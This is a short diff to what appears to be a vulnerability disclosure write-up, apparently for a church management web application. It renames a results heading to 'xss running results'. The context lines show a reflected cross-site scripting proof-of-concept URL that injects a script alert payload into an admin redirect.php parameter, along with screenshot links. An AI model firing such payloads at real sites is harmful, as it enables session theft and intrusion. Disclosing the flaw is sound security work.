@@ -13,7 +13,7 @@
 ```
 http://localhost:8001/admin/redirect.php?a=%3Cscript%3Ealert(1)%3C/script%3E
 ```
-### Sqlmap running results
+### xss running results
 ![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/1739240731354.jpg "Best church management software")
 
 ![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/1739240708154.jpg "Best church management software")
